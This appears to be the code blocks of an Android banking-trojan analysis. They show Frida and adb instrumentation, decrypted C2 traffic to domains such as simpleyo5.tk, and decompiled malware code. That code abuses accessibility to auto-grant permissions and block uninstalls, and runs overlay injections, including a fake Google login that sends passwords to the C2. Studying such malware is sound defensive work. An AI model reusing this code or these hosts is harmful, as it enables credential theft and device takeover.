["```\n$ emulator @Pixel_XL_API_30 -no-boot-anim\n```", "```\n$ emulator @Pixel_XL_API_30 -wipe-data -no-boot-anim\n```", "```\n$ adb push tcpdump /data/local/tmp\n$ adb shell chmod +x /data/local/tmp/tcpdump\n```", "```\n$ adb push frida-server /data/local/tmp\n$ adb shell chmod +x /data/local/tmp/frida-server\n```", "```\n$ adb install com.spike.old.apk\n```", "```\n$ adb root\nrestarting adbd as root\n$ adb shell find /data/data/com.spike.old\n/data/data/com.spike.old\n/data/data/com.spike.old/cache\n/data/data/com.spike.old/code_cache\n```", "```\n$ adb shell monkey -p com.spike.old 1\n```", "```\n$ adb shell \"find /data/data/com.spike.old -type f -exec file {} \\;\"\n./cache/WebView/Crashpad/settings.dat: data\n./cache/WebView/Default/HTTP Cache/Code Cache/wasm/index: data\n./cache/WebView/Default/HTTP Cache/Code Cache/wasm/index-dir/the-real-index: data\n./cache/WebView/Default/HTTP Cache/Code Cache/js/index: data\n./cache/WebView/Default/HTTP Cache/Code Cache/js/index-dir/the-real-index: data\n./cache/WebView/font_unique_name_table.pb: data\n./app_DynamicOptDex/hq.json: Zip archive data, requires at least v2.0 to extract\n./app_DynamicOptDex/oat/hq.json.cur.prof: data\n./shared_prefs/ring0.xml: ASCII text\n./shared_prefs/WebViewChromiumPrefs.xml: ASCII text\n./app_webview/variations_seed_new: empty\n./app_webview/webview_data.lock: data\n./app_webview/variations_stamp: empty\n./app_webview/Default/Web Data: data\n./app_webview/Default/Web Data-journal: empty\n./app_webview/Default/GPUCache/index: data\n./app_webview/Default/GPUCache/index-dir/the-real-index: data\n./app_webview/pref_store: ASCII text\n```", "```\n$ adb pull /data/data/com.spike.old\n```", "```\n$ cat com.spike.old/shared_prefs/ring0.xml \n<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name=\"ANCT\">simpleyo5.tk</string>\n    <string name=\"NSTG\">4</string>\n    <string name=\"AITT\"></string>\n    <string name=\"AIEN\">1</string>\n</map>\n\n$ xxd -l 48 com.spike.old/app_DynamicOptDex/hq.json \n00000000: 504b 0304 1400 0808 0800 34a2 4854 0000  PK........4.HT..\n00000010: 0000 0000 0000 0000 0000 0b00 0000 636c  ..............cl\n00000020: 6173 7365 732e 6465 782c d707 d8ce d5ff  asses.dex,......\n```", "```\n$ adb root\n$ adb exec-out \"/data/local/tmp/tcpdump -i any -U -w - 2>/dev/null\" | wireshark -k -S -i -\n```", "```\nFrame 22: 272 bytes on wire (2176 bits), \n    272 bytes captured (2176 bits) on interface -, id 0\nLinux cooked capture v1\nInternet Protocol Version 4, Src: 10.0.2.16, Dst: 23.184.48.153\nTransmission Control Protocol, Src Port: 35938, Dst Port: 80, Seq: 7301,\n    Ack: 1, Len: 216\n[6 Reassembled TCP Segments (7516 bytes): #17(1460), #18(1460),\n    #19(1460), #20(1460), #21(1460), #22(216)]\nHypertext Transfer Protocol\n    POST /ping HTTP/1.1\\r\\n\n    Content-Type: application/json; charset=UTF-8\\r\\n\n    Content-Length: 7331\\r\\n\n    Host: simpleyo5.tk\\r\\n\n    Connection: Keep-Alive\\r\\n\n    Accept-Encoding: gzip\\r\\n\n    User-Agent: okhttp/4.2.1\\r\\n\n    \\r\\n\n    [Full request URI: http://simpleyo5.tk/ping]\n    [HTTP request 1/1]\n    [Response in frame: 29]\n    File Data: 7331 bytes\nJavaScript Object Notation: application/json\n\n0000   7b 22 68 61 73 68 22 3a 22 50 42 66 69 48 48 38   {\"hash\":\"PBfiHH8\n0010   37 4d 66 54 2b 34 4c 31 68 79 34 62 6c 49 30 6d   7MfT+4L1hy4blI0m\n0020   5a 6a 2f 79 33 55 33 46 68 32 4a 78 6d 48 7a 43   Zj/y3U3Fh2JxmHzC\n0030   48 72 67 4d 3d 22 2c 22 69 64 22 3a 22 54 33 6c   HrgM=\",\"id\":\"T3l\n0040   50 46 72 45 42 42 54 55 51 46 52 64 62 32 33 43   PFrEBBTUQFRdb23C\n0050   77 44 74 6a 79 50 37 4e 33 51 34 48 75 4d 68 4e   wDtjyP7N3Q4HuMhN\n0060   54 2b 55 38 6e 6a 6a 6b 69 39 59 73 70 4d 46 49   T+U8njjki9YspMFI\n```", "```\n$ adb shell ps | grep com.spike.old\nu0_a121        3711    303 1328880 194572 do_epoll_wait       0 S com.spike.old\n$ adb logcat --pid=3711\n```", "```\n14:10:33.739  3711  3739 D pioneer_bridge_over_white_rabbits \n    (ApiVerifyRequestBody): key: 5f 9e 4a 92 b1 d8 c8 b9 8d b9 b7 f8 f8 80 0d 2e \n14:10:33.739  3711  3739 D pioneer_bridge_over_white_rabbits (\n    ApiVerifyRequestBody): url: 73 69 6d 70 6c 65 79 6f 35 2e 74 6b 2f 70 69 6e 67 \n14:10:33.740  3711  3739 D pioneer_bridge_over_white_rabbits \n    (ApiVerifyRequestBody): uid: 64 dc 5b 59 e5 46 53 8f\n```", "```\n$ adb root\n$ adb shell /data/local/tmp/frida-server\n```", "```\n$ frida-trace -U -j 'javax.crypto.Cipher!*' \\\n                 -j 'javax.crypto.spec.SecretKeySpec!*' \\\n                 -f com.spike.old\n```", "```\n  1222 ms  Cipher.getIV()\n  1222 ms     | Cipher.updateProviderIfNeeded()\n  1223 ms  <= [127,124,88,-42,38,53,-111,-46,-45,70,-89,-39,84,-32,-66,1]\n           /* TID 0x164e */\n  2150 ms  SecretKeySpec.$init([49,26,-127,53,-80,-83,-121,-50,35,-72,-79,-93,\n                                -45,-113,43,31], 0, 16, \"AES\")\n  2151 ms  Cipher.getInstance(\"AES_128/CBC/PKCS5PADDING\")\n  ...\n  2158 ms  Cipher.init(2, \"<instance: java.security.Key,\n                       $className: javax.crypto.spec.SecretKeySpec>\",\n                       \"<instance: java.security.spec.AlgorithmParameterSpec, \n                       $className: javax.crypto.spec.IvParameterSpec>\")\n                       ...\n    2163 ms  Cipher.doFinal([-26,104,-111,-55,-17,70,-86,-87,124,-117,14,\n                             59,-29,42,-28,-3,51,40,-32,-1\n```", "```\nJava.perform(() => {\n  const Cipher = Java.use(\"javax.crypto.Cipher\");\n  Cipher.doFinal.overload('[B').implementation = function() {\n    console.log(\"doFinal called from\" );\n    Java.perform(() => {\n      console.log(Java.use(\"android.util.Log\").getStackTraceString(\n        Java.use(\"java.lang.Exception\").$new()))\n    });\n\n    return this.doFinal();\n  };\n});\n```", "```\n$ frida -U -f com.spike.old -l xeno-dofinal.js\n```", "```\n[Android Emulator 5554::com.spike.old ]-> %resume\n```", "```\n[Android Emulator 5554::com.spike.old ]-> doFinal called from\njava.lang.Exception\n    at javax.crypto.Cipher.doFinal(Native Method)\n    at com.sniff.sibling.UtilEncryption.encryptMessage(UtilEncryption.java:46)\n    at com.sniff.sibling.Api.Bodies.ApiVerifyRequestBody$Builder.emplaceIdIv(\n        ApiVerifyRequestBody.java:72)\n    at com.sniff.sibling.Api.Controllers.ApiVerifyController.sendRequest(\n        ApiVerifyController.java:42)\n    at com.sniff.sibling.Services.KingService.lambda$startService$1$\n        com-securitypolicies-setup-Services-KingService(KingService.java:161)\n        at com.sniff.sibling.Services.KingService$$\n            ExternalSyntheticLambda1.run(Unknown Source:4)\n    at java.util.concurrent.ThreadPoolExecutor.runWorker(\n        ThreadPoolExecutor.java:1167)\n    ...\n\ndoFinal called from\njava.lang.Exception\n    at javax.crypto.Cipher.doFinal(Native Method)\n    at com.sniff.sibling.UtilEncryption.decryptMessage(UtilEncryption.java:75)\n    at com.sniff.sibling.Activities.AccessibilityEnableHintActivity.onStart(\n        AccessibilityEnableHintActivity.java:68)\n    at android.app.Instrumentation.callActivityOnStart(\n        Instrumentation.java:1435)\n```", "```\n{\n    \"hash\": \"c9KjsZ9C7He6VRmwPMY9YpRrW8H9UFIITKB7umfOUyo=\",\n    \"id\": \"9hbTqZU/XYXD8Z1hftmY0N63NltNY2+ihQOnUHrg9T1B/C...\",\n    \"iv\": \"M0KcSRwOMvKnbNd4TE719Q==\",\n    \"type\": \"request_verify\"\n}\n```", "```\n{\n    \"api\": 30,\n    \"apps\": [\n        \"com.android.cts.priv.ctsshim\",\n        \"com.android.internal.display.cutout.emulation.corner\",\n        \"com.android.internal.display.cutout.emulation.double\",\n        \"com.android.providers.telephony\",\n        \"com.android.dynsystem\",\n        \"com.android.theme.icon.pebble\",\n        \"com.android.providers.calendar\",\n        ...\n        \"com.android.theme.icon_pack.circular.android\"\n    ],\n    \"imei\": \"f1b9bf329f36d7ee\",\n    \"model\": \"Unknown Android SDK built for x86\",\n    \"numbers\": [\n        \"No numbers\"\n    ],\n    \"tag\": \"cleaner0902\",\n    \"uid\": \"f1b9bf329f36d7ee\"\n}\n```", "```\n{\n    \"type\": \"reponse_verify\",\n    \"hash\": \"6Judi7AChueoT88kb5yqRyA+LVY+AaRqMXPNtYAwl94=\",\n    \"iv\": \"UyRedbVBUrUG+MEuIWSO8w==\",\n    \"id\": \"8n7raTheyi0wb56/KGEpT03yrXARP1klA5c7s/1EMq8=\"\n}\n```", "```\nimport sys\nimport frida\n\ndef main():\n    emulator = frida.get_usb_device()\n    pid = emulator.spawn('com.spike.old')\n    session = emulator.attach(pid)\n    inject_script(session)\n    emulator.resume(pid)\n    sys.stdin.read()\n    session.detach()\n\nif __name__ == '__main__':\n    main()\n```", "```\ndef inject_script(session):\n\n    def on_message(message, _):\n        if message['type'] == 'send':\n            if 'input' in message['payload']:\n                write_data('iv', message['payload']['iv'])\n                write_data('input', message['payload']['input'])\n            elif 'output' in message['payload']:\n                write_data('output', message['payload']['output'])\n            elif 'key' in message['payload']:\n                write_data('key', message['payload']['key'])\n            else:\n                print('Unknown message: ', message)\n        else:\n            print('Unknown message: ', message)\n\n    with open('xeno.js', 'r', encoding='utf8') as script_file:\n        code = script_file.read()\n\n    script = session.create_script(code)\n    script.on('message', on_message)\n    script.load()\n```", "```\nimport time\n\ndef write_data(file_prefix, data):\n    current_time = round(time.time() * 1000)\n    filename = f'{current_time}_{file_prefix}.bin'\n\n    print('Writing file:', filename)\n\n    with open(filename, 'wb') as output_file:\n        output_file.write(bytearray((d % 0xFF for d in data)))\n```", "```\nconsole.log(\"Loading Javascript\");\n\nJava.perform(() => {\n  const Cipher = Java.use(\"javax.crypto.Cipher\");\n\n  Cipher.doFinal.overload('[B').implementation = function(arr) {\n    send( {'input': arr, 'iv': this.getIV() });\n\n    const result = this.doFinal(arr);\n\n    send( {'output': result });\n\n    return result;\n  };\n\n  const SecretKeySpec = Java.use(\"javax.crypto.spec.SecretKeySpec\");\n  SecretKeySpec.$init.overload(\n    \"[B\", \"int\", \"int\", \"java.lang.String\").implementation = function(\n      arr, off, len, alg) {\n    send( {'key': arr} );\n    return this.$init(arr, off, len, alg);\n  };\n\n});\n\nconsole.log(\"Javascript loaded\");\n```", "```\n$ python3 xeno.py\nLoading Javascript\nJavascript loaded\nWriting file: 1651309456940_key.bin\nWriting file: 1651309456997_iv.bin\nWriting file: 1651309456997_input.bin\nWriting file: 1651309457218_output.bin\nWriting file: 1651309458430_key.bin\nWriting file: 1651309458567_iv.bin\nWriting file: 1651309458568_input.bin\nWriting file: 1651309458682_output.bin\n```", "```\n$ xxd 1651309456940_key.bin\n00000000: 5f9d 4a91 b0d7 c7b8 8cb8 b6f7 f77f 0d2e  _.J.............\n```", "```\n{\n    \"hash\":\"3E0+xCtHOl1sRkCb1GGS/VO3xFekCMw3aR8zrPLK44o=\",\n    \"id\":\"IpDySYsxdURFmYsjS6EGkxE/ei7PsZfjjlz7OmFm5fc=\",\n    \"iv\":\"mdPtTwJDHpVjIJPyhi7xxA==\",\n    \"metrics\":\"Hfu92QtpMSbnGeWIiWC57rzdOvq3/+tXiF7D1uLb/YU=\"\n}\n```", "```\n{\n    'type': 'inj_update',\n    'injections': [\n        {\n            'app': 'ca.mobile.explorer',\n            'url': 'https://homeandofficedeal.com/local/pt/ca.mobile.explorer.html'\n        },\n        {\n            'app': 'cgd.pt.caixadirectaparticulares',\n            'url': 'https://homeandofficedeal.com/local/pt/\n                    cgd.pt.caixadirectaparticulares.html'\n        },\n        {\n            'app': 'com.abanca.bm.pt',\n            'url': 'https://homeandofficedeal.com/local/pt/com.abanca.bm.pt.html'\n        },\n        ...\n}\n```", "```\n{\n    \"permissions\": [\"notification_manager\",\"generic_permissions\"],\n    \"rm_triggered\":false,\n    \"user_present\":true,\n    \"type\":\"get_coms\"\n}\n```", "```\n$ adb logcat | grep \"Client verified\"\n16:18:07.150 D/pioneer_bridge_over_white_rabbits \n    (setVerification)( 9686): Client verified: uV+VcJoWRYP79riYnZvmUw==\n16:20:16.716 D/pioneer_bridge_over_white_rabbits\n    (setVerification)(11030): Client verified: pwp4tia4GyVyhuB7Z8HYsA==\n```", "```\n$ frida-trace -U -j 'com.sniff*!*' -f com.spike.old\nInstrumenting...                                                        \nMainApplication.$init: Loaded handler at\n    \"__handlers__/com.sniff.sibling.MainApplication/_init.js\"\nMainApplication.getContext: Loaded handler at\n    \"__handlers__/com.sniff.sibling.MainApplication/getContext.js\"\nMainApplication.getInstance: Loaded handler at\n    \"__handlers__/com.sniff.sibling.MainApplication/getInstance.js\"\nMainApplication.onCreate: Loaded handler at\n    \"__handlers__/com.sniff.sibling.MainApplication/onCreate.js\"\nStarted tracing 4 functions. Press Ctrl+C to stop.\n```", "```\n$ frida-trace -U -j 'com.sniff*!*' -p 24606\n...\n11851 ms  MainActivity.$init()\n11897 ms  MainActivity.onCreate(null)\n11957 ms     | UtilGlobal.isAccessibilityServiceEnabled(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.MainActivity>\",\n    \"<instance: java.lang.Class>\")\n...\n11994 ms     |    | UtilGlobal.startAccessibilityActivity(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.MainActivity>\")\n12005 ms     | MainActivity$1.$init(\n    \"<instance: com.sniff.sibling.MainActivity>\")\n12006 ms     | UtilGlobal.startKingService(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.MainActivity>\")\n...\n12122 ms  KingService.onStartCommand(\n    \"<instance: android.content.Intent>\", 0, 1)\n12123 ms     | UtilGlobal.Log(\"KingService\", \"onStartCommand\")\n12123 ms     | KingService.startService()\n12123 ms     |    | UtilGlobal.Log(\"KingService\", \"startService\")\n12125 ms     |    | UtilGlobal.setActualNetworkConnection(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\", 0)\n12126 ms     |    |    | UtilGlobal.SettingsWrite(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\",\n    \"ANCT\", \"simpleyo5.tk\")\n12126 ms     |    | ApiClient.create(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\")\n12346 ms     |    |    | UtilGlobal.getActualNetworkConnection(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\")\n12347 ms     |    |    |    | UtilGlobal.SettingsRead(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\", \"ANCT\")\n12348 ms     |    |    |    | <= \"simpleyo5.tk\"\n...\n12530 ms     |    | ApiVerifyController.sendRequest(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\")\n12530 ms     |    |    | UtilGlobal.getAndroidIDBytes(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\")\n12531 ms     |    |    |    | UtilGlobal.getAndroidID(\n    \"<instance: android.content.Context,\n    $className: com.sniff.sibling.Services.KingService>\")\n12534 ms     |    |    |    | <= \"f67fecc6233d8ae9\"\n12535 ms     |    |    |    | UtilEncryption.hexStringToBytes(\n    \"f67fecc6233d8ae9\")\n```", "```\n$ frida-trace -U -j 'android.view.accessibility.*!*' -f com.spike.old > accessibility_log.txt\n```", "```\n$ grep -oe \"com.sniff.sibling.[a-zA-Z0-9_.]*\" accessibility_log.txt | sort | uniq\ncom.sniff.sibling.Activities.AccessibilityEnableHintActivity\ncom.sniff.sibling.Activities.PermissionActivity\n```", "```\n$ grep -oe \"android.view.accessibility.[a-zA-Z0-9_.]*\" accessibility_log.txt | sort | uniq\n```", "```\ntestKey = UtilEncryption.hexStringToBytes(\"5f9e4a92b1d8c8b98db9b7f8f8800d2e\");\napis = Arrays.asList(\"simpleyo5.tk\", \"simpleyo5.cf\", \"kart12sec.ga\", \"kart12sec.gq\");\n```", "```\npublic static final String actualNetworkConnectionTag = \"ANCT\";\npublic static final String apiLocationOperation = \"metrics\";\npublic static final String apiLocationVerify = \"ping\";\n...\npublic static final String appCodename = \"pioneer_bridge_over_white_rabbits\";\npublic static final String appInjectTableTag = \"AITT\";\n...\npublic static final String appInjectsEnabledTag = \"AIEN\";\n...\npublic static final String appTag = \"cleaner0902\";\n...\npublic static final String networkStateTag = \"NSTG\";\n```", "```\nString[] strArr = new String[10];\nstrArr[0] = \"android.permission.READ_SMS\";\nstrArr[1] = \"android.permission.RECEIVE_SMS\";\nstrArr[2] = \"android.permission.WAKE_LOCK\";\nstrArr[3] = \"android.permission.RECEIVE_BOOT_COMPLETED\";\nstrArr[4] = \"android.permission.ACCESS_NETWORK_STATE\";\nstrArr[5] = \"android.permission.INTERNET\";\nstrArr[6] = \"android.permission.READ_PHONE_STATE\";\nString str = null;\nstrArr[7] = Build.VERSION.SDK_INT > 28 ? \n    \"android.permission.USE_FULL_SCREEN_INTENT\" : null;\nstrArr[8] = Build.VERSION.SDK_INT > 28 ?\n    \"android.permission.FOREGROUND_SERVICE\" : null;\nif (Build.VERSION.SDK_INT > 28) {\n    str = \"android.permission.READ_PHONE_NUMBERS\";\n}\nstrArr[9] = str;\npermissions = strArr;\n```", "```\npublic void parsePayload(byte[] bArr) {\n    char c;\n    String str = new String(bArr, StandardCharsets.UTF_8);\n    UtilGlobal.Log(\"parsePayload\", \"<<< \" + str);\n    String str2 = ApiSimpleMetricsPayload.fromJson(str).type;\n    int hashCode = str2.hashCode();\n    if (hashCode == 748954943) {\n        if (str2.equals(\"notif_ic_update\")) {\n            c = 2;\n        }\n        c = 65535;\n    } else if (hashCode != 1513349731) {\n        if (hashCode == 1976172123 && str2.equals(\"get_coms\")) {\n            c = 0;\n        }\n        c = 65535;\n    } else {\n        if (str2.equals(\"inj_update\")) {\n            c = 1;\n        }\n        c = 65535;\n    }\n    if (c == 0) {\n        ApiGetCommandsResponsePayload.fromJson(str).execute(\n            this.contextWeakReference.get());\n    } else if (c == 1) {\n        ApiInjectionUpdateResponsePayload.fromJson(str).execute(\n            this.contextWeakReference.get());\n    }\n}\n```", "```\npublic /* synthetic */ void m13xbc1baa29(Handler handler) {\n    ...\n    if (!UtilGlobal.isInternetConnected(this)) {\n        UtilGlobal.Log(TAG, \"Network disconnected\");\n    } else if (UtilGlobal.isNetworkBusy(this) != 0) {\n        UtilGlobal.Log(TAG, \"Network busy, dropping one step\");\n        UtilGlobal.flagNetworkAsBusy(\n            this, UtilGlobal.isNetworkBusy(this) - 1);\n    } else if (!UtilGlobal.checkClientVerification(this) || \n            UtilGlobal.clientVerificationExpired(this, 300000L)) {\n        UtilGlobal.Log(TAG, \"Client is not verified. Verifying... \");\n        new ApiVerifyController().sendRequest(this);\n        UtilGlobal.flagNetworkAsBusy(this, 5);\n    } else if (UtilGlobal.SettingsRead(\n            this, Constants.appInjectTableTag).isEmpty()) {\n        apiOperationController.sendRequest(\n            this, new ApiSimpleMetricsPayload(\"inj_update\"));\n        UtilGlobal.enableInjections(this);\n    } else {\n        apiOperationController.sendRequest(\n            this, new ApiOperationRequestPayload(this, \"get_coms\"));\n    }\n    if (UtilGlobal.checkClientVerification(this)) {\n        if (!UtilGlobal.checkPermissions(this)) {\n            UtilGlobal.Log(TAG, \"Permissions revoked!\");\n        } else if (!UtilGlobal.isNotificationServiceEnabled(this)) {\n            UtilGlobal.grantNotificationListenerAccess(this);\n            UtilGlobal.millisecondsSleep(15000);\n        } else if (!UtilGlobal.isIgnoringBatteryOptimizations(this)) {\n            UtilGlobal.startDozeMode(this);\n        }\n    }\n    UtilGlobal.millisecondsSleep(15000);\n}\n```", "```\nString[] strArr = this.commands;\nint length = strArr.length;\nfor (int i = 0; i < length; i++) {\n    String str = strArr[i];\n    UtilGlobal.Log(\"ApiGetCommandsResponsePayload\", str);\n    strArr = strArr;\n    switch (str.hashCode()) {\n        case -2081539234:\n            if (str.equals(\"sms_log\")) {\n                c = 11;\n                break;\n            }\n            c = 65535;\n            break;\n        case -1691298703:\n            if (str.equals(\"self_kill\")) {\n                c = 17;\n                break;\n            }\n            c = 65535;\n            break;\n        case -646462158:\n            if (str.equals(\"notif_ic_disable\")) {\n        ...\n```", "```\npublic void windowStateChangedEvent(AccessibilityEvent accessibilityEvent) {\n    if (accessibilityEvent.getPackageName() != null) {\n        if (UtilGlobal.injectionsEnabled(this) && UtilGlobal.packageHasInjection(\n                this, accessibilityEvent.getPackageName().toString())) {\n            Intent intent = new Intent(this, OverlayInjectActivity.class);\n            intent.addFlags(268435456);\n            intent.addFlags(8388608);\n            UtilGlobal.SettingsWrite(this, Constants.appInjectTag, \n                accessibilityEvent.getPackageName().toString());\n            startActivity(intent);\n        } else if (UtilAccessibility.getEventClassName(accessibilityEvent).equals(\n                \"com.miui.home.launcher.uninstall.deletedialog\")) {\n            UtilAccessibility.goBack(this, 2);\n        } else if (UtilAccessibility.getEventClassName(accessibilityEvent).equals(\n                \"com.android.packageinstaller.uninstalleractivity\")) {\n            UtilAccessibility.goBack(this, 2);\n        } else if (accessibilityEvent.getPackageName().equals(\n                \"com.google.android.packageinstaller\")) {\n            UtilAccessibility.goBack(this, 2);\n        }\n        ...\n        this.modulesManager.performAllNecessary(this, accessibilityEvent);\n        if (UtilAccessibility.checkPermissionsClick(this, accessibilityEvent)) {\n            UtilGlobal.Log(\"windowStateChangedEvent\", \"grantPermissionsClick called\");\n            UtilAccessibility.grantPermissionsClick(this, accessibilityEvent);\n        }\n        DozeModeAccessibilityModule.performIfNecessary(...);\n        XiaomiDozeModeAccessibilityModule.performIfNecessary(...);\n        DisablePreventionAccessibilityModule.performIfNecessary(...);\n        DefaultSmsAppAccessibilityModule.performIfNecessary(...);\n    DeletionPreventionAccessibilityModule.performIfNecessary(...);\n        XiaomiSpecialPermissionInterceptActivityModule.performIfNecessary(...);\n        ...\n    }\n}\n```", "```\npublic static boolean checkPermissionsClick(\n        AccessibilityService accessibilityService,\n        AccessibilityEvent accessibilityEvent) {\n    return (\n        accessibilityEvent.getPackageName().toString().contains(\"permissioncontroller\") || \n        accessibilityEvent.getPackageName().toString().equals(\"packageinstaller\")\n        ) && (\n        findFirstNodeByName(accessibilityEvent.getSource(), Constants.appName) != null)\n        && !UtilGlobal.checkPermissions(accessibilityService);\n}\n```", "```\npublic static boolean grantPermissionsClick(\n        AccessibilityService accessibilityService,\n        AccessibilityEvent accessibilityEvent) {\n    try {\n        return pressAllowButton(accessibilityEvent.getSource());\n    } catch (Exception unused) {\n        return false;\n    }\n}\n```", "```\npublic static boolean pressAllowButton(\n        AccessibilityNodeInfo accessibilityNodeInfo) {\n    boolean z = false;\n    for (String str : Constants.allowButtonsIdList) {\n        z |= pressButtonByViewId(accessibilityNodeInfo, str);\n    }\n    if (!z) {\n        for (String str2 : Constants.allowButtonsLabelList) {\n            z |= pressButtonByText(accessibilityNodeInfo, str2);\n        }\n    }\n    UtilGlobal.Log(TAG, \"IsPressAllowSuccessful: \" + z);\n    return z;\n}\n```", "```\npublic static boolean pressButtonByText(\n        AccessibilityNodeInfo accessibilityNodeInfo, String str) {\n    if (accessibilityNodeInfo == null) {\n        return false;\n    }\n    while (true) {\n        boolean z = false;\n        for (AccessibilityNodeInfo accessibilityNodeInfo2 : \n                accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) {\n            if (accessibilityNodeInfo2.isClickable()) {\n                if (z || clickButton(accessibilityNodeInfo2)) {\n                    z = true;\n                }\n            }\n        }\n        return z;\n    }\n}\n```", "```\npublic static boolean clickButton(\n        AccessibilityNodeInfo accessibilityNodeInfo) {\n    if (accessibilityNodeInfo == null) {\n        return false;\n    }\n    return accessibilityNodeInfo.performAction(16);\n}\n```", "```\n@Override // android.app.Activity\nprotected void onStart() {\n    super.onStart();\n    this.context = this;\n    OverlayInjectResource packageInjection = UtilGlobal.getPackageInjection(\n        this, UtilGlobal.SettingsRead(this, Constants.appInjectTag));\n    this.resource = packageInjection;\n    this.hideStop = true;\n    if (!this.stopActivity && packageInjection != null) {\n        try {\n            WebView webView = new WebView(this);\n            this.wv = webView;\n            webView.getSettings().setJavaScriptEnabled(true);\n            this.wv.setScrollBarStyle(0);\n            this.wv.setWebViewClient(new MyWebViewClient());\n            this.wv.setWebChromeClient(new MyWebChromeClient());\n            this.wv.addJavascriptInterface(new WebAppInterface(this), \n                \"Android\");\n            this.wv.loadDataWithBaseURL(null, \n                this.resource.getPageResource(this),\n                    \"text/html\", \"UTF-8\", null);\n            setContentView(this.wv);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```", "```\npublic static class WebAppInterface {\n    OverlayInjectActivity parent;\n\n    WebAppInterface(OverlayInjectActivity overlayInjectActivity) {\n        this.parent = overlayInjectActivity;\n    }\n\n    @JavascriptInterface\n    public void send_log_injects(String str) {\n        returnResult(str);\n    }\n\n    @JavascriptInterface\n    public void returnResult(String str) {\n        new ApiOperationController().sendRequest(\n            this.parent,\n            new ApiInjectionSuccessRequestPayload(\n                \"inj_success\",\n                new ApiInjectionSuccess(\n                    UtilGlobal.SettingsRead(\n                        this.parent, Constants.appInjectTag),\n                    str)\n            ),\n        true);\n        OverlayInjectActivity overlayInjectActivity = this.parent;\n        UtilGlobal.flagPackageInjectionIgnored(\n            overlayInjectActivity, overlayInjectActivity.resource.id);\n        this.parent.finish();\n    }\n}\n```", "```\n<body>\n    <div id=\"googlemail\" style=\"display: none;\">\n    ...\n    <input class=\"googlelogininput\" id=\"passwordinput\"\n           type=\"password\" name=\"password\" placeholder=\"Password\">\n\n    <div class=\"linktext forgotemail\">Forgot password?</div>\n    <div class=\"spacer\"></div>\n    <button class=\"button\" onclick=\"checkPassword();\">Next</button>\n    ...\n</body>\n\nfunction checkPassword() {\n    if(document.getElementById('passwordinput').value.length > 5) {\n        process('googlemail');\n    }\n}\n\nfunction process(formId) {\n    var ua = navigator.userAgent.toLowerCase();\n    if(ua.indexOf(\"android\") > -1) {\n        try {\n            Android.send_log_injects(formToJSONbyName(\n                document.getElementById(formId)));\n        } catch (err) {}\n    }else{\n        alert(formToJSONbyName(document.getElementById(formId)));\n    }\n}\n```"]